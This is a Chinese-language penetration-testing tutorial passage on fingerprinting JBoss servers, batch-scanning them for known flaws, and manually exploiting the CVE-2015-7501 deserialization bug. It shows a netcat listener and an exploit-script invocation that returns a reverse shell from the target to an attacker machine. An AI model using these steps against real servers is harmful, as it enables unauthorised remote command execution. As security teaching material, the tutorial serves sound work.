## Jboss网站识别方法 🔍
上一节我们介绍了Jboss的基本概念，本节中我们来看看如何识别一个网站是否使用了Jboss。

![](img/3d68d7c2f58db455dae7310111c6e42a_15.png)

![](img/3d68d7c2f58db455dae7310111c6e42a_17.png)

Jboss默认开放于**8080**端口，并使用**HTTP**协议。其默认访问页面具有特定样式。

以下是识别Jboss网站的主要特征：
*   **默认端口**：服务通常运行在**8080**端口。
*   **特定页面**：访问该端口会呈现Jboss的默认欢迎页面，不同版本页面样式有所不同，但通常会包含Jboss的图标或文字标识。

## Jboss漏洞批量检测 🛡️
识别出Jboss网站后，下一步是检测其可能存在的安全漏洞。我们可以使用自动化脚本进行批量检测。

以下是使用检测脚本的步骤：
1.  准备脚本文件，通常包含 `target.txt`（目标列表文件）和 `jboss_scan.py`（主扫描脚本）。
2.  在 `target.txt` 文件中，按行填入目标IP和端口，格式如 `IP:PORT`。
3.  使用Python 3环境执行扫描脚本。

**注意**：执行环境是关键。如果执行后无反应，可能是Python版本问题。请确认系统命令指向正确的Python 3解释器。例如：
*   `python` 可能指向Python 2。
*   `python3` 明确指向Python 3。
*   自定义命名如 `python38` 则指向Python 3.8。

![](img/3d68d7c2f58db455dae7310111c6e42a_29.png)

![](img/3d68d7c2f58db455dae7310111c6e42a_31.png)

执行命令示例：
```bash
python3 jboss_scan.py
```
脚本运行后，会输出检测结果，提示目标可能存在的漏洞，例如：
*   JMX控制台未授权访问漏洞
*   CVE-2015-7501 反序列化漏洞
*   admin-console 控制台漏洞

## 单个漏洞手动验证与利用 ⚔️
上一节我们介绍了批量检测，本节中我们来看看如何对单个漏洞进行手动验证和深入利用。

![](img/3d68d7c2f58db455dae7310111c6e42a_39.png)

![](img/3d68d7c2f58db455dae7310111c6e42a_41.png)

对于特定漏洞（如CVE-2015-7501），可以手动访问特定URL进行验证。如果服务器返回**状态码500**，则表明该漏洞很可能存在。

该漏洞源于Jboss HTTP Invoker组件中的过滤器存在Java反序列化问题，可导致远程命令执行（RCE）。

![](img/3d68d7c2f58db455dae7310111c6e42a_43.png)

![](img/3d68d7c2f58db455dae7310111c6e42a_45.png)

![](img/3d68d7c2f58db455dae7310111c6e42a_47.png)

以下是利用该漏洞获取反弹Shell的步骤：
1.  **监听端**：在攻击机上使用Netcat监听一个端口，准备接收连接。
    ```bash
    nc -lvp 1234
    ```
2.  **攻击端**：使用专门的漏洞利用脚本（如 `jboss_rce.py`）。
3.  执行攻击脚本，通常需要指定目标URL和反弹Shell的接收地址（IP和端口）。

![](img/3d68d7c2f58db455dae7310111c6e42a_49.png)

![](img/3d68d7c2f58db455dae7310111c6e42a_51.png)

![](img/3d68d7c2f58db455dae7310111c6e42a_53.png)

脚本执行命令示例（Python 2环境）：
```bash
python jboss_rce.py -u http://target_ip:8080/invoker/readonly
```
执行后，脚本会提示输入接收反弹Shell的IP和端口（即第一步中Netcat监听的地址）。输入后，脚本会尝试攻击目标服务器，并在成功后将目标服务器的Shell会话反弹到攻击机的Netcat监听端口。

![](img/3d68d7c2f58db455dae7310111c6e42a_55.png)

![](img/3d68d7c2f58db455dae7310111c6e42a_57.png)

![](img/3d68d7c2f58db455dae7310111c6e42a_59.png)

**注意**：实际测试中，目标服务可能不可用或存在防护，导致利用失败。这属于正常情况，需要根据实际环境进行排查。
